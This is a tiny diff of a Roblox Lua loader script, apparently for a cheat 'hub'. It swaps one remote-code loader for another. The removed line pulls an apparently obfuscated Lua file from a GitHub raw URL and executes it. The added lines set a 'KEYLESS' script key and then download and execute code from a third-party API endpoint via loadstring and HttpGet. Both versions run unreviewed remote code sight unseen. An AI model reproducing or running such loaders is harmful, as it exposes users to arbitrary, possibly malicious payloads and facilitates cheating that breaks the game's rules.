@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/abublibuaakab/Fx-Hub-/refs/heads/main/25ms_obf.lua%20(7).txt"))()
+getgenv().SCRIPT_KEY = "KEYLESS"
+
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/9916d887ed7348c44a8de048f877aa247353143623a38baf6cceb06d7a341dea/download"))()
